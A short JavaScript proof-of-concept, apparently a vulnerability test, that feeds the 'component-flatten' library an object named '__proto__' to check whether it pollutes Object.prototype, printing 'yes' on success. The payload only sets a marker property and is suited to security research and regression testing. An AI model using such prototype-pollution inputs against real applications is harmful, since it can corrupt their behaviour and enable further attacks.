var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const cf = require('component-flatten');
let tree = {
    ref: 'polluted',
    name: '__proto__'
};
cf(tree);
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}